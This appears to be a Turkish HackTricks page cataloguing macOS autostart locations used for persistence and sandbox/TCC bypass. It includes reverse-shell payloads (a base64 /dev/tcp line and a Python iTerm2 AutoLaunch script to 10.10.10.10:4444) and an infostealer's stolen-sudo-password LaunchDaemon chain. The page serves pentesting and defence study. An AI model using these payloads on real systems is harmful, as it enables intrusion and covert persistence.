# macOS Otomatik Başlatma

{{#include ../banners/hacktricks-training.md}}

Bu bölüm büyük ölçüde blog serisi [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) üzerine dayanır; amaç **more Autostart Locations** (mümkünse) eklemek, hangi tekniklerin güncel macOS sürümünde (13.4) hâlâ çalıştığını belirtmek ve gerekli **izinleri** açıklamaktır.

## Sandbox Bypass

> [!TIP]
> Burada, bir dosyaya yazarak ve çok yaygın bir eylemi, belirli bir süreyi veya genellikle sandbox içinde root izni gerektirmeden gerçekleştirebildiğiniz bir eylemi bekleyerek bir şeyi çalıştırmanıza izin veren **sandbox bypass** için kullanışlı başlangıç konumlarını bulabilirsiniz.

### Launchd

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **`/Library/LaunchAgents`**
- **Tetikleyici**: Yeniden başlatma
- Root gereklidir
- **`/Library/LaunchDaemons`**
- **Tetikleyici**: Yeniden başlatma
- Root gereklidir
- **`/System/Library/LaunchAgents`**
- **Tetikleyici**: Yeniden başlatma
- Root gereklidir
- **`/System/Library/LaunchDaemons`**
- **Tetikleyici**: Yeniden başlatma
- Root gereklidir
- **`~/Library/LaunchAgents`**
- **Tetikleyici**: Oturuma yeniden giriş
- **`~/Library/LaunchDemons`**
- **Tetikleyici**: Oturuma yeniden giriş

> [!TIP]
> İlginç bir bilgi olarak, **`launchd`** Mach-o bölümünde `__Text.__config` adlı gömülü bir property list içerir; bu liste launchd'nin başlatması gereken diğer iyi bilinen servisleri içerir. Ayrıca bu servisler `RequireSuccess`, `RequireRun` ve `RebootOnSuccess` öğelerini içerebilir; bu da bunların çalıştırılmaları ve başarıyla tamamlanmaları gerektiği anlamına gelir.
>
> Elbette, kod imzalama nedeniyle değiştirilemez.

#### Açıklama ve Sömürme

**`launchd`** OX S kernel tarafından başlangıçta çalıştırılan ilk proses ve kapamada son biten prosestir. Her zaman **PID 1** olmalıdır. Bu süreç şu dizinlerde belirtilen **ASEP** **plists** içindeki konfigürasyonları **okur ve çalıştırır**:

- `/Library/LaunchAgents`: Yönetici tarafından yüklenen kullanıcı başına agent'lar
- `/Library/LaunchDaemons`: Yönetici tarafından yüklenen sistem genelinde daemon'lar
- `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başına agent'lar
- `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelinde daemon'lar

Bir kullanıcı oturum açtığında `/Users/$USER/Library/LaunchAgents` ve `/Users/$USER/Library/LaunchDemons` içindeki plists, oturum açan kullanıcının izinleriyle başlatılır.

Agent'lar ile daemon'lar arasındaki ana fark, agent'ların kullanıcı oturum açtığında yüklenmesi, daemon'ların ise sistem başlangıcında yüklenmesidir (örneğin ssh gibi kullanıcı erişiminden önce çalıştırılması gereken servisler vardır). Ayrıca agent'lar GUI kullanabilirken daemon'lar arka planda çalışmalıdır.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Bazı durumlarda bir **Agent'in kullanıcı girişinden önce çalıştırılması gerekir**, bunlara **PreLoginAgents** denir. Örneğin, bu, girişte yardımcı teknoloji sağlamak için faydalıdır. Ayrıca `/Library/LaunchAgents` içinde de bulunabilirler (örnek için [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)).

> [!TIP]
> Yeni Daemons veya Agents konfigürasyon dosyaları **bir sonraki yeniden başlatmadan sonra veya** `launchctl load <target.plist>` **kullanılarak yüklenecektir**. `.plist` uzantısı olmayan dosyaları `launchctl -F <file>` ile yüklemek de **mümkündür** (ancak bu plist dosyaları yeniden başlatma sonrası otomatik olarak yüklenmez).\
> `launchctl unload <target.plist>` ile **kaldırmak** de mümkündür (işaret ettiği süreç sonlandırılacaktır),
>
> Bir Agent veya Daemon'un **çalışmasını** **engelleyen** (ör. bir override gibi) **herhangi bir şeyin** olmadığından **emin olmak** için şu komutu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Geçerli kullanıcı tarafından yüklenen tüm Agent ve Daemon'ları listeleyin:
```bash
launchctl list
```
#### Örnek kötü amaçlı LaunchDaemon zinciri (parola yeniden kullanımı)

Yakın zamanda bir macOS infostealer, bir user agent ve root LaunchDaemon bırakmak için **ele geçirilmiş sudo parolasını** yeniden kullandı:

- Agent döngüsünü `~/.agent`'e yazın ve çalıştırılabilir yapın.
- O agent'ı işaret eden bir plist'i `/tmp/starter` içinde oluşturun.
- Çalınmış parolayı `sudo -S` ile kullanarak bunu `/Library/LaunchDaemons/com.finder.helper.plist`'e kopyalayın, `root:wheel` olarak ayarlayın ve `launchctl load` ile yükleyin.
- Çıktıyı ayırmak için ajanın çalıştırılmasını sessizce `nohup ~/.agent >/dev/null 2>&1 &` ile başlatın.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Eğer bir plist bir kullanıcıya aitse, daemon sistem genelindeki klasörlerde olsa bile, **görev kullanıcı olarak çalıştırılacaktır** ve root olarak çalıştırılmaz. Bu bazı privilege escalation attacks'i engelleyebilir.

#### More info about launchd

**`launchd`** çekirdekten başlatılan **ilk** kullanıcı modu sürecidir. Sürecin başlatılması **başarılı** olmalı ve **çıkamaz veya çökemez**. Hatta bazı **killing signals**'a karşı **korunmuştur**.

`launchd`'nin yaptığı ilk işlerden biri tüm **daemon**'ları **başlatmak** olacaktır, örneğin:

- **Timer daemons** zaman bazlı olarak çalıştırılanlar:
- atd (`com.apple.atrun.plist`): `StartInterval` değeri 30 dakika
- crond (`com.apple.systemstats.daily.plist`): `StartCalendarInterval` ile 00:15'te başlar
- **Network daemons** gibi:
- `org.cups.cups-lpd`: TCP'de dinler (`SockType: stream`) ve `SockServiceName: printer`
- SockServiceName ya bir port olmalı ya da `/etc/services` içindeki bir service olmalı
- `com.apple.xscertd.plist`: TCP üzerinde 1640 portunda dinler
- **Path daemons** belirtilen bir yol değiştiğinde çalıştırılanlar:
- `com.apple.postfix.master`: `/etc/postfix/aliases` yolunu kontrol ediyor
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices` girdisinde `com.apple.xscertd.helper` adını belirtiyor
- **UserEventAgent:**
- Bu, önceki olandan farklıdır. Belirli bir olaya yanıt olarak launchd'nin uygulamalar spawn etmesini sağlar. Ancak bu durumda ilgili ana ikili `launchd` değil `/usr/libexec/UserEventAgent`'dir. Bu, her plugin'in başlatıcısını `XPCEventModuleInitializer` anahtarında veya daha eski plugin'ler için `Info.plist`'indeki `CFPluginFactories` sözlüğünde `FB86416D-6164-2070-726F-70735C216EC0` anahtarı altında belirttiği, SIP ile kısıtlanmış /System/Library/UserEventPlugins/ klasöründen plugin'leri yükler.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Sandbox'ı atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Ancak bu dosyaları yükleyen bir shell çalıştıran bir TCC bypass'ı olan bir uygulama bulmanız gerekir

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: zsh ile bir terminal açmak
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: zsh ile bir terminal açmak
- Root required
- **`~/.zlogout`**
- **Trigger**: zsh ile bir terminalden çıkmak
- **`/etc/zlogout`**
- **Trigger**: zsh ile bir terminalden çıkmak
- Root required
- Muhtemelen daha fazlası: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bash ile bir terminal açmak
- `/etc/profile` (çalışmadı)
- `~/.profile` (çalışmadı)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xterm ile tetiklenmesi bekleniyor, ancak **yüklü değil** ve yüklendikten sonra bile bu hata veriliyor: xterm: `DISPLAY is not set`

#### Description & Exploitation

`zsh` veya `bash` gibi bir shell ortamı başlatıldığında, **belirli başlangıç dosyaları çalıştırılır**. macOS şu anda varsayılan shell olarak `/bin/zsh`'i kullanır. Bu shell, Terminal uygulaması başlatıldığında veya bir cihaza SSH ile erişildiğinde otomatik olarak kullanılır. `bash` ve `sh` de macOS'ta mevcut olsa da, kullanılmaları için açıkça çağrılmaları gerekir.

zsh'in man sayfası, **`man zsh`** ile okunabilir ve başlangıç dosyaları hakkında uzun bir açıklama içerir.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Yeniden Açılan Uygulamalar

> [!CAUTION]
> Belirtilen exploitation'ı yapılandırmak ve loging-out ve loging-in yapmak ya da hatta rebooting yapmak, app'i çalıştırmak için bende işe yaramadı. (Uygulama çalıştırılmıyordu; belki bu eylemler gerçekleştirilirken app'in running olması gerekiyor)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Kullanışlı — bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Tetikleyici**: Restart reopening applications

#### Açıklama & Exploitation

Tüm yeniden açılacak uygulamalar plist'in içinde `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Yani, reopen applications'in kendi uygulamanızı başlatmasını sağlamak için yapmanız gereken tek şey **app'inizi listeye eklemek**.

UUID, o dizini listeleyerek veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` ile bulunabilir

Yeniden açılacak uygulamaları kontrol etmek için şunu yapabilirsiniz:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Bu listeye bir **uygulama eklemek** için şunu kullanabilirsiniz:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Tercihleri

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal, onu kullanan kullanıcının FDA izinlerine sahipti

#### Konum

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Tetikleyici**: Terminal'i aç

#### Açıklama ve İstismar

Uygulamaların kullanıcı tercihleri **`~/Library/Preferences`** içinde saklanır. Bu tercihlerden bazıları **diğer uygulamaları/komut dosyalarını çalıştırma** yapılandırması içerebilir.

Örneğin, Terminal başlangıçta bir komut çalıştırabilir:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Bu yapılandırma **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasında şu şekilde görünür:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Yani, sistemdeki Terminal tercihleri plist'i üzerine yazılabilirse, **`open`** işlevi terminali açmak ve o komutun çalıştırılmasını sağlamak için kullanılabilir.

Bunu cli üzerinden şu şekilde ekleyebilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Diğer dosya uzantıları

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal, kullanıcının FDA izinlerine sahip olduğunda kullanılabilir

#### Konum

- **Herhangi bir yer**
- **Tetikleyici**: Terminal'i açmak

#### Açıklama & Sömürme

Eğer bir [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) oluşturur ve açarsanız, **Terminal uygulaması** orada belirtilen komutları çalıştırmak için otomatik olarak çağrılacaktır. Eğer Terminal uygulamasının TCC gibi bazı özel ayrıcalıkları varsa, komutunuz bu özel ayrıcalıklarla çalıştırılacaktır.

Şunu deneyin:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> If Terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).

### Audio Eklentileri

İnceleme: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
İnceleme: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Sandbox atlatmada kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ek TCC erişimi elde edebilirsiniz

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Root erişimi gerekli
- **Tetikleyici**: coreaudiod veya bilgisayarı yeniden başlatma
- **`/Library/Audio/Plug-ins/Components`**
- Root erişimi gerekli
- **Tetikleyici**: coreaudiod veya bilgisayarı yeniden başlatma
- **`~/Library/Audio/Plug-ins/Components`**
- **Tetikleyici**: coreaudiod veya bilgisayarı yeniden başlatma
- **`/System/Library/Components`**
- Root erişimi gerekli
- **Tetikleyici**: coreaudiod veya bilgisayarı yeniden başlatma

#### Description

Önceki yazılara göre bazı audio eklentilerini derleyip bunların yüklenmesini sağlamak mümkün.

### QuickLook Eklentileri

İnceleme: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Sandbox atlatmada kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Ek TCC erişimi elde edebilirsiniz

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Açıklama & Sömürme

QuickLook eklentileri, bir dosyanın önizlemesini tetiklediğinizde (Finder'da dosya seçiliyken boşluk tuşuna basmak) ve o dosya türünü destekleyen bir eklenti yüklüyse çalıştırılabilir.

Kendi QuickLook eklentinizi derleyip önceki konumlardan birine yerleştirerek yüklenecek şekilde ayarlayabilir ve sonra desteklenen bir dosyaya gidip boşluk tuşuna basarak bunu tetikleyebilirsiniz.

### ~~Giriş/Çıkış Hooks~~

> [!CAUTION]
> Bu benim için çalışmadı; ne kullanıcı LoginHook ile ne de root LogoutHook ile

**İnceleme**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Sandbox atlatmada kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Aşağıdakine benzer bir komutu çalıştırabiliyor olmanız gerekiyor: `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Bulunduğu yer: `~/Library/Preferences/com.apple.loginwindow.plist`

Kullanımdan kaldırılmış olsalar da, bir kullanıcı giriş yaptığında komut çalıştırmak için kullanılabilirler.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Bu ayar şu konumda saklanır: `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Bunu silmek için:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root kullanıcısına ait olan şu konumda saklanır: **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Koşullu Sandbox Bypass

> [!TIP]
> Burada, sadece bir şeyi **bir dosyaya yazarak** çalıştırmanıza ve belirli **programların yüklü olması, "alışılmadık" kullanıcı** eylemleri veya ortamlar gibi pek yaygın olmayan koşulları beklemeyi içerebilen **sandbox bypass** için faydalı başlangıç konumlarını bulabilirsiniz.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Sandbox bypass için faydalı: [✅](https://emojipedia.org/check-mark-button)
- Ancak, `crontab` binary'sini çalıştırabiliyor olmanız gerekir
- Veya root olmalısınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Doğrudan yazma erişimi için root gereklidir. `crontab <file>` çalıştırabiliyorsanız root gerekmez
- **Trigger**: cron job'a bağlıdır

#### Description & Exploitation

Aşağıdaki komutla **geçerli kullanıcı**nın cron job'larını listeleyin:
```bash
crontab -l
```
Kullanıcıların tüm cron jobs'larını ayrıca **`/usr/lib/cron/tabs/`** ve **`/var/at/tabs/`** içinde görebilirsiniz (root gerekir).

MacOS'ta **belirli sıklıkta** scriptleri çalıştıran birkaç klasör şurada bulunur:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Burada normal **cron** **jobs**, **at** **jobs** (çok kullanılmayan) ve **periodic** **jobs** (çoğunlukla geçici dosyaları temizlemek için kullanılan) bulabilirsiniz. Günlük **periodic** **jobs** örneğin şu komutla çalıştırılabilir: `periodic daily`.

Bir **user cronjob programatically** eklemek için şu komut kullanılabilir:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

İnceleme: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Sandbox atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 önceden TCC izinlerine sahipti

#### Konumlar

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Tetikleyici**: iTerm açıldığında
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Tetikleyici**: iTerm açıldığında
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Tetikleyici**: iTerm açıldığında

#### Açıklama ve İstismar

Scripts, **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** içinde saklandığında çalıştırılacaktır. Örneğin:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
veya:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
The script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** ayrıca çalıştırılacaktır:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2 tercihlerinde bulunan **`~/Library/Preferences/com.googlecode.iterm2.plist`** dosyası, iTerm2 terminali açıldığında çalıştırılacak bir komutu **belirtebilir**.

Bu ayar iTerm2 ayarlarında yapılandırılabilir:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Ve komut tercihlere yansır:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Çalıştırılacak komutu şu şekilde ayarlayabilirsiniz:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> iTerm2 tercihlerini suistimal ederek keyfi komutlar çalıştırmak için muhtemelen başka yollar vardır.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak xbar kurulu olmalı
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Erişilebilirlik (Accessibility) izinleri ister

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Tetikleyici**: xbar çalıştırıldığında

#### Description

Eğer popüler [**xbar**](https://github.com/matryer/xbar) programı yüklüyse, **`~/Library/Application\ Support/xbar/plugins/`** dizinine bir shell script yazılması mümkündür; bu script xbar başlatıldığında çalıştırılacaktır:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Yazı**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Hammerspoon yüklü olmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Erişilebilirlik izinleri ister

#### Konum

- **`~/.hammerspoon/init.lua`**
- **Tetikleyici**: Hammerspoon çalıştırıldığında

#### Açıklama

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) macOS için bir otomasyon platformu olarak hizmet verir ve işlemleri için **LUA betik dilini** kullanır. Özellikle, tam AppleScript kodunun entegrasyonunu ve shell scripts çalıştırılmasını destekler; bu da betik yeteneklerini önemli ölçüde artırır.

Uygulama tek bir dosya olan `~/.hammerspoon/init.lua`'i arar ve başlatıldığında bu betik çalıştırılır.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak BetterTouchTool'un yüklü olması gerekir
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts ve Accessibility izinleri ister

#### Konum

- `~/Library/Application Support/BetterTouchTool/*`

Bu araç, bazı kısayollar basıldığında çalıştırılacak uygulamaları veya script'leri belirtmeye olanak tanır. Bir saldırgan veritabanına kendi **kısayolunu ve çalıştırılacak eylemi** yapılandırarak rastgele kod çalıştırtırabilir (bir kısayol sadece bir tuşa basmak da olabilir).

### Alfred

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Alfred'in yüklü olması gerekir
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation, Accessibility ve hatta Full-Disk access izinleri ister

#### Konum

- `???`

Belirli koşullar sağlandığında kod çalıştırabilen workflow'lar oluşturulmasına izin verir. Potansiyel olarak bir saldırgan bir workflow dosyası oluşturup Alfred'in bunu yüklemesini sağlayabilir (workflow'ları kullanmak için premium sürüme ödeme yapmak gereklidir).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak ssh etkinleştirilmeli ve kullanılmalıdır
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH eskiden Full Disk Access (FDA) erişimine sahipti

#### Konum

- **`~/.ssh/rc`**
- **Tetikleyici:** SSH ile giriş
- **`/etc/ssh/sshrc`**
- Root gereklidir
- **Tetikleyici:** SSH ile giriş

> [!CAUTION]
> SSH'i açmak Full Disk Access gerektirir:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Açıklama ve İstismar

Varsayılan olarak, `/etc/ssh/sshd_config` içinde `PermitUserRC no` olmadığı sürece, bir kullanıcı **SSH ile giriş yaptığında** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** script'leri çalıştırılır.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak `osascript`'ı argümanlarla çalıştırmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Tetikleyici:** Login
- Exploit payload, `osascript` çağırılarak saklanır
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Tetikleyici:** Login
- Root gereklidir

#### Açıklama

System Preferences -> Users & Groups -> **Login Items** altında kullanıcı giriş yaptığında çalıştırılacak **öğeleri** bulabilirsiniz.\
Komut satırından bunları listelemek, eklemek ve kaldırmak mümkündür:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Bu öğeler şu dosyada saklanır **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** ayrıca API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) kullanılarak da belirtilebilir; bu yapılandırmayı **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** içinde saklayacaktır.

### ZIP as Login Item

(Önceki bölümdeki Login Items kısmına bakın, bu bir genişletmedir)

